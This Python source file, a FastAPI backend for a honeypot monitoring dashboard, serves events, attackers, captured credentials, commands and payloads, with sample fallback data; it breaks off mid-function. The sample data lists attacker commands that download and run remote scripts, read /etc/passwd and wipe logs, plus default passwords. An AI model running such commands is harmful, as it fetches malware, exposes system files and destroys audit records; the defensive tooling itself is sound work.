"""FastAPI server: serves the React UI + REST API for it.

The React app lives at ``../../webui/`` and builds to ``../../webui/dist``.
We mount that directory at / so the same uvicorn process serves both the
static frontend and the /api/* endpoints.

API contract is defined in ``meli/webapi/openapi.yaml`` (mirror of the
React app's typed Orval-generated client). Every endpoint queries real
SQLAlchemy models from ``meli.database.models``; when the DB is empty or
unreachable, endpoints fall back to mockup-shaped sample data so the
dashboard always renders end-to-end on first launch.

Endpoints implemented (v2.9, matching webui/src/api/api.ts):

  GET  /api/healthz                       — server + DB reachability
  GET  /api/dashboard/summary             — KPI tile values
  GET  /api/dashboard/severity            — severity breakdown counts
  GET  /api/dashboard/top-attackers       — top N by event count
  GET  /api/dashboard/intensity           — 24h hourly attack volume
  GET  /api/dashboard/honeypot-fleet      — honeypot fleet status
  GET  /api/dashboard/capacity            — honey jar capacity %
  GET  /api/events?limit&offset&severity&service
  GET  /api/events/{id}
  GET  /api/attackers?limit&offset&search
  GET  /api/attackers/{id}
  GET  /api/attackers/{id}/reputation
  GET  /api/credentials?limit&offset
  GET  /api/commands?limit&offset
  GET  /api/payloads?limit&offset
  GET  /api/services
  GET  /api/sessions?limit&offset
  GET  /api/alerts?acknowledged
  PATCH /api/alerts/{id}/acknowledge
  GET  /api/reports
  GET  /api/botnets
  GET  /api/ip-reputation?ip
"""
from __future__ import annotations

import datetime as dt
import json
import os
import time
import zlib
from contextlib import contextmanager
from pathlib import Path
from typing import Any, Iterable, Optional

from fastapi import FastAPI, HTTPException, Query
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse, JSONResponse
from fastapi.staticfiles import StaticFiles


# ─── Paths ────────────────────────────────────────────────────────────────
def _resolve_webui_dist() -> Path:
    env = os.environ.get("MELI_WEBUI_DIST")
    if env:
        return Path(env).resolve()
    candidates = [
        Path("/opt/meli/app/webui/dist"),
        Path(__file__).resolve().parent.parent.parent / "webui" / "dist",
        Path.cwd() / "webui" / "dist",
    ]
    for c in candidates:
        if c.exists():
            return c.resolve()
    return candidates[0]


WEBUI_DIST = _resolve_webui_dist()
SERVER_START_TS = time.time()


# ─── DB hooks (graceful degrade) ──────────────────────────────────────────
def _db_path() -> Path:
    env = os.environ.get("MELI_DB_PATH")
    if env:
        return Path(env)
    return Path.home() / ".local" / "share" / "meli" / "meli.db"


@contextmanager
def _session():
    """Yield a SQLAlchemy session or None if the backend is unreachable."""
    sess = None
    try:
        try:
            from sqlalchemy import create_engine
            from sqlalchemy.orm import sessionmaker
            from meli.database import models  # noqa: F401
        except Exception:
            yield None
            return
        path = _db_path()
        if not path.exists():
            yield None
            return
        engine = create_engine(f"sqlite:///{path}", future=True)
        Session = sessionmaker(bind=engine, future=True)
        sess = Session()
        yield sess
    finally:
        if sess is not None:
            try:
                sess.close()
            except Exception:
                pass


def _iso(dtval) -> Optional[str]:
    if dtval is None:
        return None
    if isinstance(dtval, str):
        return dtval
    try:
        return dtval.isoformat()
    except Exception:
        return str(dtval)


def _ip_to_id(ip: str) -> int:
    """Stable integer id derived from an IP string. Used ONLY for the static
    in-process sample data (8 IPs, zero collision risk). Real DB rows go
    through ``_attacker_id_for_ip`` instead, which is collision-free."""
    return zlib.crc32(ip.encode("utf-8")) & 0x7FFFFFFF


# Collision-free bidirectional cache between integer ids (what the React app
# uses on the wire) and IP strings (what the Attacker model keys on).
# Populated lazily, append-only, deterministic for any DB state because we
# always walk attackers in (first_seen ASC, ip ASC) order.
_ATTACKER_IP_BY_ID: dict[int, str] = {}
_ATTACKER_ID_BY_IP: dict[str, int] = {}


def _ensure_attacker_index(s) -> None:
    if s is None:
        return
    try:
        from meli.database.models import Attacker
        rows = (s.query(Attacker.ip)
                 .order_by(Attacker.first_seen.asc(), Attacker.ip.asc()).all())
        for (ip,) in rows:
            if ip and ip not in _ATTACKER_ID_BY_IP:
                new_id = len(_ATTACKER_IP_BY_ID) + 1
                _ATTACKER_ID_BY_IP[ip] = new_id
                _ATTACKER_IP_BY_ID[new_id] = ip
    except Exception:
        pass  # index is best-effort; lookups can still fall back to sample mode


def _attacker_id_for_ip(s, ip: str) -> int:
    """Return the stable int id for an IP, creating it if needed."""
    if ip in _ATTACKER_ID_BY_IP:
        return _ATTACKER_ID_BY_IP[ip]
    _ensure_attacker_index(s)
    if ip in _ATTACKER_ID_BY_IP:
        return _ATTACKER_ID_BY_IP[ip]
    # Brand-new attacker we haven't seen yet — append.
    new_id = len(_ATTACKER_IP_BY_ID) + 1
    _ATTACKER_ID_BY_IP[ip] = new_id
    _ATTACKER_IP_BY_ID[new_id] = ip
    return new_id


def _ip_for_attacker_id(s, attacker_id: int) -> Optional[str]:
    if attacker_id in _ATTACKER_IP_BY_ID:
        return _ATTACKER_IP_BY_ID[attacker_id]
    _ensure_attacker_index(s)
    return _ATTACKER_IP_BY_ID.get(attacker_id)


def _norm_sev(s: Optional[str]) -> str:
    """Normalize DB severity ('CRITICAL', 'INFO', ...) → lowercase tokens
    the React app uses ('critical', 'info', ...)."""
    if not s:
        return "info"
    return s.strip().lower()


def _json_list(raw: Optional[str]) -> list:
    if not raw:
        return []
    try:
        v = json.loads(raw)
        return v if isinstance(v, list) else []
    except Exception:
        return []


# ─── App ──────────────────────────────────────────────────────────────────
app = FastAPI(title="Meli Web API", version="2.9.0")

app.add_middleware(
    CORSMiddleware,
    allow_origins=[
        "http://127.0.0.1:5179", "http://localhost:5179",
        "http://127.0.0.1:5000", "http://localhost:5000",
    ],
    allow_methods=["GET", "PATCH"],
    allow_headers=["*"],
)


# ─── Sample data (used when DB is empty / unreachable) ────────────────────
_SAMPLE_EVENTS = [
    {"id": i + 1, "timestamp": (dt.datetime.utcnow() - dt.timedelta(minutes=i*7)).isoformat() + "Z",
     "sourceIp": ip, "sourceCountry": country, "sourceCountryCode": cc,
     "service": svc, "eventType": etype, "severity": sev,
     "username": user, "password": pw, "command": cmd, "payload": payload, "raw": None}
    for i, (ip, country, cc, svc, etype, sev, user, pw, cmd, payload) in enumerate([
        ("185.220.101.42", "Germany", "DE", "cowrie",    "login_attempt", "critical", "root", "admin123", None, None),
        ("45.155.205.119", "Netherlands", "NL", "cowrie", "login_attempt", "high",    "admin", "password", None, None),
        ("194.5.249.18",   "Russia", "RU", "dionaea",   "connection",    "medium",   None, None, None, None),
        ("171.25.193.77",  "Germany", "DE", "cowrie",    "command_exec",  "critical", None, None, "cat /etc/passwd", None),
        ("103.75.190.28",  "China", "CN", "conpot",     "port_scan",     "high",     None, None, None, None),
        ("198.98.51.189",  "United States", "US", "heralding", "login_attempt", "low", "user", "12345", None, None),
        ("89.248.167.131", "Netherlands", "NL", "cowrie", "file_download","critical", None, None, None, "wget http://malware.ru/miner.sh"),
        ("91.108.4.152",   "France", "FR", "endlessh",  "connection",    "info",     None, None, None, None),
    ])
]

_SAMPLE_ATTACKERS = [
    {"id": _ip_to_id(ip), "ip": ip, "country": c, "countryCode": cc, "asn": asn, "org": org,
     "firstSeen": (dt.datetime.utcnow() - dt.timedelta(days=days)).isoformat() + "Z",
     "lastSeen":  (dt.datetime.utcnow() - dt.timedelta(minutes=mins)).isoformat() + "Z",
     "attackCount": cnt, "isSticky": sticky, "riskScore": risk}
    for ip, c, cc, asn, org, days, mins, cnt, sticky, risk in [
        ("185.220.101.42", "Germany", "DE", "AS208294", "Foundation for Applied Privacy (Tor)",     12, 1,    412, True,  92.0),
        ("45.155.205.119", "Netherlands", "NL", "AS49981", "WorldStream B.V. (VPN)",                  8, 4,    287, True,  78.0),
        ("194.5.249.18",   "Russia", "RU", "AS56873", "BAXET",                                       21, 12,   198, False, 64.0),
        ("171.25.193.77",  "Germany", "DE", "AS208294", "Foundation for Applied Privacy (Tor)",     34, 2,    156, True,  88.0),
        ("103.75.190.28",  "China",  "CN", "AS135377", "UCloud HK",                                  6, 28,   142, False, 71.0),
        ("198.98.51.189",  "United States", "US", "AS53667", "FranTech Solutions",                  19, 47,    98, False, 55.0),
        ("89.248.167.131", "Netherlands", "NL", "AS202425", "IP Volume Inc",                         15, 8,     87, True,  82.0),
    ]
]

_SAMPLE_FLEET = [
    {"id": 1, "name": "cowrie",    "protocol": "SSH",   "port": 22,   "status": "online",   "eventsToday": 1842, "lastSeen": dt.datetime.utcnow().isoformat() + "Z"},
    {"id": 2, "name": "dionaea",   "protocol": "MULTI", "port": 0,    "status": "online",   "eventsToday": 412,  "lastSeen": dt.datetime.utcnow().isoformat() + "Z"},
    {"id": 3, "name": "conpot",    "protocol": "SCADA", "port": 102,  "status": "online",   "eventsToday": 156,  "lastSeen": dt.datetime.utcnow().isoformat() + "Z"},
    {"id": 4, "name": "heralding", "protocol": "MULTI", "port": 0,    "status": "online",   "eventsToday": 287,  "lastSeen": dt.datetime.utcnow().isoformat() + "Z"},
    {"id": 5, "name": "endlessh",  "protocol": "SSH",   "port": 2222, "status": "online",   "eventsToday": 65,   "lastSeen": dt.datetime.utcnow().isoformat() + "Z"},
    {"id": 6, "name": "glastopf",  "protocol": "HTTP",  "port": 80,   "status": "degraded", "eventsToday": 0,    "lastSeen": (dt.datetime.utcnow() - dt.timedelta(hours=4)).isoformat() + "Z"},
    {"id": 7, "name": "mailoney",  "protocol": "SMTP",  "port": 25,   "status": "online",   "eventsToday": 12,   "lastSeen": dt.datetime.utcnow().isoformat() + "Z"},
]

_SAMPLE_BOTNETS = [
    {"id": 1, "name": "Mirai-variant-A",  "family": "Mirai",  "firstSeen": (dt.datetime.utcnow() - dt.timedelta(days=42)).isoformat() + "Z", "lastSeen": dt.datetime.utcnow().isoformat() + "Z", "nodeCount": 1247, "c2Servers": ["185.220.101.42", "194.5.249.18"], "targetedServices": ["ssh", "telnet"], "riskLevel": "critical"},
    {"id": 2, "name": "Gafgyt-cluster-7", "family": "Gafgyt", "firstSeen": (dt.datetime.utcnow() - dt.timedelta(days=18)).isoformat() + "Z", "lastSeen": dt.datetime.utcnow().isoformat() + "Z", "nodeCount": 412,  "c2Servers": ["45.155.205.119"],                  "targetedServices": ["ssh"],          "riskLevel": "high"},
    {"id": 3, "name": "Mozi-residual",    "family": "Mozi",   "firstSeen": (dt.datetime.utcnow() - dt.timedelta(days=180)).isoformat() + "Z", "lastSeen": (dt.datetime.utcnow() - dt.timedelta(days=2)).isoformat() + "Z", "nodeCount": 89, "c2Servers": [],                                  "targetedServices": ["http"],         "riskLevel": "medium"},
]

# ─── Helpers ──────────────────────────────────────────────────────────────
def _ingest_rate_per_min(s) -> int:
    """Approximate ingest rate from events in the last minute."""
    if s is None:
        return 142
    try:
        from meli.database.models import Event
        since = dt.datetime.now(dt.timezone.utc) - dt.timedelta(minutes=1)
        return int(s.query(Event).filter(Event.timestamp >= since).count())
    except Exception:
        return 0


def _db_size_mb() -> float:
    p = _db_path()
    try:
        return round(p.stat().st_size / (1024 * 1024), 1) if p.exists() else 0.0
    except Exception:
        return 0.0


def _uptime_seconds() -> int:
    return int(time.time() - SERVER_START_TS)


# ─── Routes: health + dashboard ───────────────────────────────────────────
@app.get("/api/healthz")
def healthz():
    """Surface DB reachability so operators can distinguish an empty-but-
    healthy backend from a misconfigured one. Always returns 200 (the React
    client only checks status code); inspect ``db`` to debug."""
    db_state = "missing"  # no DB file yet — sample data being served
    db_error: Optional[str] = None
    try:
        with _session() as s:
            if s is not None:
                from meli.database.models import Event
                s.query(Event).limit(1).all()
                db_state = "ok"
    except Exception as exc:
        db_state = "error"
        db_error = str(exc)[:200]
    body = {"status": "ok", "db": db_state, "version": "2.9.0"}
    if db_error:
        body["dbError"] = db_error
    return body


@app.get("/api/health")
def health_legacy():
    """Legacy v1 endpoint for backwards-compat with older callers."""
    body = healthz()
    body["timestamp"] = dt.datetime.utcnow().isoformat() + "Z"
    return body


@app.get("/api/dashboard/summary")
def dashboard_summary():
    sample = {
        "eventsLast24h": 2762, "eventsChangePercent": 18.0,
        "criticalAlerts": 47, "criticalUnacknowledged": 14,
        "uniqueAttackers": 384, "attackersNewToday": 12, "attackersDegraded": 1,
        "honeypotsOnline": 6, "honeypotsTotal": 7,
        "lastStrikeIp": "185.220.101.42",
        "lastStrikeAt": dt.datetime.utcnow().isoformat() + "Z",
        "strikesPerHour": 184, "peakStrikesPerHour": 312,
        "uptimeSeconds": _uptime_seconds(),
        "ingestRatePerMin": 142,
        "dbSizeMb": _db_size_mb() or 384.2,
    }
    with _session() as s:
        if s is None:
            return sample
        try:
            from meli.database.models import Event, Alert, Attacker, Honeypot
            now = dt.datetime.now(dt.timezone.utc)
            since24 = now - dt.timedelta(hours=24)
            since48 = now - dt.timedelta(hours=48)
            events_24 = int(s.query(Event).filter(Event.timestamp >= since24).count())
            events_prev = int(s.query(Event).filter(Event.timestamp >= since48,
                                                     Event.timestamp < since24).count())
            change_pct = None
            if events_prev > 0:
                change_pct = round((events_24 - events_prev) * 100.0 / events_prev, 1)
            crit = int(s.query(Alert).filter(Alert.severity.in_(["CRITICAL", "critical"])).count())
            crit_un = int(s.query(Alert).filter(Alert.severity.in_(["CRITICAL", "critical"]),
                                                 Alert.acknowledged == False).count())  # noqa: E712
            uniq = int(s.query(Attacker).count())
            new_today = int(s.query(Attacker).filter(Attacker.first_seen >= since24).count())
            online = int(s.query(Honeypot).filter(Honeypot.enabled == True).count())  # noqa: E712
            total = int(s.query(Honeypot).count())
            last = s.query(Event).order_by(Event.timestamp.desc()).first()
            strikes_hr = int(s.query(Event).filter(
                Event.timestamp >= (now - dt.timedelta(hours=1))).count())
            return {
                "eventsLast24h": events_24,
                "eventsChangePercent": change_pct,
                "criticalAlerts": crit,
                "criticalUnacknowledged": crit_un,
                "uniqueAttackers": uniq,
                "attackersNewToday": new_today,
                "attackersDegraded": max(0, total - online),
                "honeypotsOnline": online or sample["honeypotsOnline"],
                "honeypotsTotal": total or sample["honeypotsTotal"],
                "lastStrikeIp": (last.source_ip if last else sample["lastStrikeIp"]),
                "lastStrikeAt": _iso(last.timestamp) if last else sample["lastStrikeAt"],
                "strikesPerHour": strikes_hr,
                "peakStrikesPerHour": max(strikes_hr, sample["peakStrikesPerHour"]),
                "uptimeSeconds": _uptime_seconds(),
                "ingestRatePerMin": _ingest_rate_per_min(s),
                "dbSizeMb": _db_size_mb(),
            }
        except Exception:
            return sample


@app.get("/api/dashboard/severity")
def dashboard_severity():
    sample = {"critical": 47, "high": 124, "medium": 286, "low": 412, "info": 1893, "total": 2762}
    with _session() as s:
        if s is None:
            return sample
        try:
            from meli.database.models import Event
            from sqlalchemy import func
            rows = s.query(Event.severity, func.count(Event.id)).group_by(Event.severity).all()
            out = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
            for sev, c in rows:
                key = _norm_sev(sev)
                if key in out:
                    out[key] += int(c)
            total = sum(out.values())
            if total == 0:
                return sample
            out["total"] = total
            return out
        except Exception:
            return sample


@app.get("/api/dashboard/top-attackers")
def dashboard_top_attackers(limit: int = Query(10, ge=1, le=100)):
    with _session() as s:
        if s is None:
            return [{"rank": i + 1, "ip": a["ip"], "country": a["country"] or "Unknown",
                     "countryCode": a["countryCode"], "asn": a["asn"], "attackCount": a["attackCount"]}
                    for i, a in enumerate(_SAMPLE_ATTACKERS[:limit])]
        try:
            from meli.database.models import Attacker
            rows = (s.query(Attacker)
                     .order_by(Attacker.total_events.desc())
                     .limit(limit).all())
            if not rows:
                return [{"rank": i + 1, "ip": a["ip"], "country": a["country"] or "Unknown",
                         "countryCode": a["countryCode"], "asn": a["asn"], "attackCount": a["attackCount"]}
                        for i, a in enumerate(_SAMPLE_ATTACKERS[:limit])]
            return [{
                "rank": i + 1, "ip": a.ip,
                "country": (a.organization or a.country_code or "Unknown"),
                "countryCode": a.country_code,
                "asn": a.asn,
                "attackCount": int(a.total_events or 0),
            } for i, a in enumerate(rows)]
        except Exception:
            return [{"rank": i + 1, "ip": a["ip"], "country": a["country"] or "Unknown",
                     "countryCode": a["countryCode"], "asn": a["asn"], "attackCount": a["attackCount"]}
                    for i, a in enumerate(_SAMPLE_ATTACKERS[:limit])]


@app.get("/api/dashboard/intensity")
def dashboard_intensity():
    now = dt.datetime.now(dt.timezone.utc).replace(minute=0, second=0, microsecond=0)
    buckets = {(now - dt.timedelta(hours=i)).isoformat(): 0 for i in range(24)}
    with _session() as s:
        if s is None:
            import random
            random.seed(42)
            return [{"hour": h, "count": random.randint(40, 260)} for h in sorted(buckets.keys())]
        try:
            from meli.database.models import Event
            since = now - dt.timedelta(hours=24)
            rows = (s.query(Event.timestamp)
                     .filter(Event.timestamp >= since).all())
            for (ts,) in rows:
                if ts is None:
                    continue
                hour_key = ts.replace(minute=0, second=0, microsecond=0,
                                       tzinfo=dt.timezone.utc).isoformat()
                if hour_key in buckets:
                    buckets[hour_key] += 1
            if sum(buckets.values()) == 0:
                import random
                random.seed(42)
                return [{"hour": h, "count": random.randint(40, 260)} for h in sorted(buckets.keys())]
            return [{"hour": h, "count": c} for h, c in sorted(buckets.items())]
        except Exception:
            import random
            random.seed(42)
            return [{"hour": h, "count": random.randint(40, 260)} for h in sorted(buckets.keys())]


@app.get("/api/dashboard/honeypot-fleet")
def dashboard_fleet():
    with _session() as s:
        if s is None:
            return _SAMPLE_FLEET
        try:
            from meli.database.models import Honeypot
            rows = s.query(Honeypot).all()
            if not rows:
                return _SAMPLE_FLEET
            return [{
                "id": int(h.id),
                "name": h.name,
                "protocol": (h.honeypot_type or "MULTI").upper(),
                "port": 0,
                "status": "online" if h.enabled else "offline",
                "eventsToday": int(h.total_events_received or 0),
                "lastSeen": _iso(h.last_event_at),
            } for h in rows]
        except Exception:
            return _SAMPLE_FLEET


@app.get("/api/dashboard/capacity")
def dashboard_capacity():
    max_capacity = 10000
    with _session() as s:
        captured = 2762
        if s is not None:
            try:
                from meli.database.models import Event
                captured = int(s.query(Event).count()) or captured
            except Exception:
                pass
    pct = round(min(100.0, captured * 100.0 / max_capacity), 1)
    return {"capacityPercent": pct, "totalCaptured": captured, "maxCapacity": max_capacity}


# ─── Routes: events ───────────────────────────────────────────────────────
def _event_to_dict(e) -> dict:
    parsed: dict = {}
    if getattr(e, "parsed_data", None):
        try:
            parsed = json.loads(e.parsed_data) or {}
        except Exception:
            parsed = {}
    return {
        "id": int(e.id),
        "timestamp": _iso(e.timestamp),
        "sourceIp": e.source_ip,
        "sourceCountry": parsed.get("country") or e.country_code,
        "sourceCountryCode": e.country_code,
        "service": e.honeypot_service,
        "eventType": (parsed.get("event_type") or parsed.get("eventid") or "event"),
        "severity": _norm_sev(e.severity),
        "username": e.username,
        "password": None,  # encrypted at rest, never exposed
        "command": e.command,
        "payload": None,
        "raw": None,
    }


@app.get("/api/events")
def list_events(limit: int = Query(50, ge=1, le=500),
                offset: int = Query(0, ge=0),
                severity: Optional[str] = None,
                service: Optional[str] = None):
    with _session() as s:
        if s is None:
            data = list(_SAMPLE_EVENTS)
            if severity:
                data = [e for e in data if e["severity"] == severity.lower()]
            if service:
                data = [e for e in data if e["service"] == service]
            return data[offset:offset + limit]
        try:
            from meli.database.models import Event
            q = s.query(Event).order_by(Event.timestamp.desc())
            if severity:
                q = q.filter(Event.severity.ilike(severity))
            if service:
                q = q.filter(Event.honeypot_service == service)
            rows = q.offset(offset).limit(limit).all()
            if not rows and offset == 0:
                return _SAMPLE_EVENTS[:limit]
            return [_event_to_dict(e) for e in rows]
        except Exception:
            return _SAMPLE_EVENTS[:limit]


@app.get("/api/events/{event_id}")
def get_event(event_id: int):
    with _session() as s:
        if s is None:
            for e in _SAMPLE_EVENTS:
                if e["id"] == event_id:
                    return e
            raise HTTPException(404, "event not found")
        try:
            from meli.database.models import Event
            e = s.query(Event).filter(Event.id == event_id).first()
            if not e:
                raise HTTPException(404, "event not found")
            return _event_to_dict(e)
        except HTTPException:
            raise
        except Exception as exc:
            raise HTTPException(500, f"event lookup failed: {exc}")


# ─── Routes: attackers ────────────────────────────────────────────────────
def _attacker_to_dict(a, s=None) -> dict:
    return {
        "id": _attacker_id_for_ip(s, a.ip),
        "ip": a.ip,
        "country": a.organization or a.country_code,
        "countryCode": a.country_code,
        "asn": a.asn,
        "org": a.organization,
        "firstSeen": _iso(a.first_seen) or dt.datetime.utcnow().isoformat() + "Z",
        "lastSeen":  _iso(a.last_seen)  or dt.datetime.utcnow().isoformat() + "Z",
        "attackCount": int(a.total_events or 0),
        "isSticky": bool(getattr(a, "is_tor", False) or getattr(a, "is_known_bot", False)),
        "riskScore": float(a.reputation_score) if a.reputation_score is not None else None,
    }


@app.get("/api/attackers")
def list_attackers(limit: int = Query(50, ge=1, le=500),
                   offset: int = Query(0, ge=0),
                   search: Optional[str] = None):
    with _session() as s:
        if s is None:
            data = list(_SAMPLE_ATTACKERS)
            if search:
                q = search.lower()
                data = [a for a in data if q in a["ip"].lower() or q in (a["country"] or "").lower()]
            return data[offset:offset + limit]
        try:
            from meli.database.models import Attacker
            q = s.query(Attacker).order_by(Attacker.total_events.desc())
            if search:
                like = f"%{search}%"
                q = q.filter((Attacker.ip.ilike(like)) | (Attacker.organization.ilike(like)))
            rows = q.offset(offset).limit(limit).all()
            if not rows and offset == 0 and not search:
                return _SAMPLE_ATTACKERS[:limit]
            _ensure_attacker_index(s)
            return [_attacker_to_dict(a, s) for a in rows]
        except Exception as exc:
            raise HTTPException(500, f"attackers query failed: {exc}")


@app.get("/api/attackers/{attacker_id}")
def get_attacker(attacker_id: int):
    with _session() as s:
        if s is None:
            for a in _SAMPLE_ATTACKERS:
                if a["id"] == attacker_id:
                    return a
            raise HTTPException(404, "attacker not found")
        try:
            from meli.database.models import Attacker
            ip = _ip_for_attacker_id(s, attacker_id)
            if ip is None:
                raise HTTPException(404, "attacker not found")
            a = s.query(Attacker).filter(Attacker.ip == ip).first()
            if not a:
                raise HTTPException(404, "attacker not found")
            return _attacker_to_dict(a, s)
        except HTTPException:
            raise
        except Exception as exc:
            raise HTTPException(500, f"attacker lookup failed: {exc}")


def _reputation_for_ip(s, ip: str) -> dict:
    sample = {
        "ip": ip,
        "abuseConfidenceScore": 85, "isKnownAttacker": True,
        "isTor": False, "isVpn": True, "isHosting": True,
        "country": "Netherlands", "org": "WorldStream B.V.",
        "greynoiseClassification": "malicious",
        "virusTotalPositives": 12, "shodanPorts": "22, 80, 443, 2222",
        "lastSeen": dt.datetime.utcnow().isoformat() + "Z",
        "sources": ["AbuseIPDB", "GreyNoise", "VirusTotal", "Shodan"],
    }
    if s is None:
        return sample
    try:
        from meli.database.models import Attacker
        a = s.query(Attacker).filter(Attacker.ip == ip).first()
        if not a:
            return sample
        return {
            "ip": a.ip,
            "abuseConfidenceScore": int(a.abuseipdb_score) if a.abuseipdb_score is not None else a.reputation_score,
            "isKnownAttacker": bool(a.is_known_bot),
            "isTor": bool(a.is_tor),
            "isVpn": bool(a.is_vpn),
            "isHosting": False,
            "country": a.organization or a.country_code,
            "org": a.organization,
            "greynoiseClassification": a.greynoise_classification,
            "virusTotalPositives": int(a.virustotal_malicious) if a.virustotal_malicious is not None else None,
            "shodanPorts": None,
            "lastSeen": _iso(a.last_seen),
            "sources": [src for src, ok in [
                ("AbuseIPDB", a.abuseipdb_score is not None),
                ("GreyNoise", bool(a.greynoise_classification)),
                ("VirusTotal", a.virustotal_malicious is not None),
            ] if ok] or ["GeoIP"],
        }
    except Exception:
        return sample


@app.get("/api/attackers/{attacker_id}/reputation")
def get_attacker_reputation(attacker_id: int):
    with _session() as s:
        if s is None:
            for a in _SAMPLE_ATTACKERS:
                if a["id"] == attacker_id:
                    return _reputation_for_ip(None, a["ip"])
            raise HTTPException(404, "attacker not found")
        ip = _ip_for_attacker_id(s, attacker_id)
        if ip is None:
            raise HTTPException(404, "attacker not found")
        return _reputation_for_ip(s, ip)


@app.get("/api/ip-reputation")
def lookup_ip_reputation(ip: str = Query(..., min_length=3)):
    with _session() as s:
        return _reputation_for_ip(s, ip)


# ─── Routes: credentials / commands / payloads ────────────────────────────
@app.get("/api/credentials")
def list_credentials(limit: int = Query(50, ge=1, le=500), offset: int = Query(0, ge=0)):
    sample = [{
        "id": i + 1, "username": u, "password": p,
        "firstSeen": (dt.datetime.utcnow() - dt.timedelta(days=i)).isoformat() + "Z",
        "lastSeen":  (dt.datetime.utcnow() - dt.timedelta(hours=i)).isoformat() + "Z",
        "count": c, "service": svc,
    } for i, (u, p, c, svc) in enumerate([
        ("root", "admin123", 412, "cowrie"), ("admin", "password", 287, "cowrie"),
        ("root", "12345",     198, "heralding"), ("user", "user",      156, "cowrie"),
        ("root", "toor",      142, "cowrie"), ("admin", "admin",      98, "heralding"),
        ("oracle", "oracle",   87, "cowrie"), ("pi", "raspberry",     74, "cowrie"),
    ])]
    with _session() as s:
        if s is None:
            return sample[offset:offset + limit]
        try:
            from meli.database.models import Credential
            rows = (s.query(Credential)
                     .order_by(Credential.attempt_count.desc())
                     .offset(offset).limit(limit).all())
            if not rows and offset == 0:
                return sample[:limit]
            return [{
                "id": int(c.id),
                "username": c.username, "password": c.password,
                "firstSeen": _iso(c.first_seen),
                "lastSeen":  _iso(c.last_seen),
                "count": int(c.attempt_count or 0),
                "service": (_json_list(c.source_honeypots)[:1] or ["unknown"])[0],
            } for c in rows]
        except Exception:
            return sample[:limit]


@app.get("/api/commands")
def list_commands(limit: int = Query(50, ge=1, le=500), offset: int = Query(0, ge=0)):
    sample = [{
        "id": i + 1, "command": cmd,
        "timestamp": (dt.datetime.utcnow() - dt.timedelta(minutes=i*5)).isoformat() + "Z",
        "sourceIp": ip, "session": f"sess-{i:04d}", "count": cnt,
    } for i, (cmd, ip, cnt) in enumerate([
        ("cat /etc/passwd",                          "185.220.101.42", 89),
        ("wget http://malware.ru/miner.sh",          "89.248.167.131", 67),
        ("chmod +x /tmp/x && ./x",                   "185.220.101.42", 54),
        ("uname -a",                                 "194.5.249.18",   142),
        ("id",                                       "171.25.193.77",  98),
        ("curl -O http://198.51.100.4/payload",      "45.155.205.119", 41),
        ("rm -rf /var/log/*",                        "103.75.190.28",  28),
        ("crontab -l",                               "198.98.51.189",  19),
    ])]
    with _session() as s:
        if s is None:
            return sample[offset:offset + limit]
        try:
            from meli.database.models import Command
            rows = (s.query(Command)
                     .order_by(Command.last_seen.desc())
                     .offset(offset).limit(limit).all())
            if not rows and offset == 0:
                return sample[:limit]
            return [{
                "id": int(c.id),
                "command": c.command_text,
                "timestamp": _iso(c.last_seen) or _iso(c.first_seen),
                "sourceIp": (_json_list(c.source_ips)[:1] or [""])[0],
                "session": None,
                "count": int(c.execution_count or 0),
            } for c in rows]
        except Exception:
            return sample[:limit]


@app.get("/api/payloads")
def list_payloads(limit: int = Query(50, ge=1, le=500), offset: int = Query(0, ge=0)):
    sample = [{
        "id": i + 1, "filename": fn, "sha256": sha, "md5": None,
        "firstSeen": (dt.datetime.utcnow() - dt.timedelta(days=i)).isoformat() + "Z",
        "lastSeen":  (dt.datetime.utcnow() - dt.timedelta(hours=i)).isoformat() + "Z",
        "size": sz, "mimeType": mt, "threatName": tn, "downloadCount": dc,
    } for i, (fn, sha, sz, mt, tn, dc) in enumerate([
        ("miner.sh",     "a"*64, 4096,    "text/x-shellscript", "Linux.Miner.Generic", 23),
        ("payload.elf",  "b"*64, 65536,   "application/x-executable", "Mirai.Variant.A", 18),
        ("x86_64.bin",   "c"*64, 131072,  "application/octet-stream", "Gafgyt.Bot",     12),
        ("install.sh",   "d"*64, 2048,    "text/x-shellscript", None,                   7),
        ("update.tgz",   "e"*64, 524288,  "application/gzip",   "Mozi.P2P",             4),
    ])]
    with _session() as s:
        if s is None:
            return sample[offset:offset + limit]
        try:
            from meli.database.models import Payload
            rows = (s.query(Payload)
                     .order_by(Payload.captured_at.desc())
                     .offset(offset).limit(limit).all())
            if not rows and offset == 0:
                return sample[:limit]
            return [{
                "id": int(p.id),
                "filename": Path(p.file_path or "").name or (p.sha256 or "")[:12],
                "sha256": p.sha256, "md5": p.md5,
                "firstSeen": _iso(p.captured_at),
                "lastSeen":  _iso(p.captured_at),
                "size": int(p.file_size or 0),
                "mimeType": p.file_type,
                "threatName": p.virustotal_score,
                "downloadCount": 1,
            } for p in rows]
        except Exception:
            return sample[:limit]


# ─── Routes: services ─────────────────────────────────────────────────────
@app.get("/api/services")
def list_services():
    return dashboard_fleet()


# ─── Routes: sessions ─────────────────────────────────────────────────────
@app.get("/api/sessions")
def list_sessions(limit: int = Query(50, ge=1, le=500), offset: int = Query(0, ge=0)):
    sample = [{
        "id": i + 1, "sourceIp": ip, "country": c,
        "startedAt": (dt.datetime.utcnow() - dt.timedelta(hours=i)).isoformat() + "Z",
        "endedAt":   (dt.datetime.utcnow() - dt.timedelta(hours=i, minutes=-12)).isoformat() + "Z",
        "duration": dur, "commandCount": cmd, "isSticky": st, "tarpitSeconds": tp,
    } for i, (ip, c, dur, cmd, st, tp) in enumerate([
        ("185.220.101.42", "Germany",    742, 18, True,  742),
        ("45.155.205.119", "Netherlands",412, 9,  False, 0),
        ("194.5.249.18",   "Russia",    1287, 24, True,  1287),
        ("171.25.193.77",  "Germany",    523, 14, True,  523),
        ("103.75.190.28",  "China",      198, 4,  False, 0),
    ])]
    with _session() as s:
        if s is None:
            return sample[offset:offset + limit]
        try:
            from meli.database.models import EventSession
            rows = (s.query(EventSession)
                     .order_by(EventSession.start_time.desc())
                     .offset(offset).limit(limit).all())
            if not rows and offset == 0:
                return sample[:limit]
            out = []
            for sess in rows:
                start = sess.start_time
                end = sess.end_time
                dur = 0
                if start and end:
                    try:
                        dur = int((end - start).total_seconds())
                    except Exception:
                        dur = 0
                out.append({
                    "id": int(sess.id),
                    "sourceIp": sess.source_ip,
                    "country": None,
                    "startedAt": _iso(start) or dt.datetime.utcnow().isoformat() + "Z",
                    "endedAt": _iso(end),
                    "duration": dur,
                    "commandCount": int(sess.event_count or 0),
                    "isSticky": False,
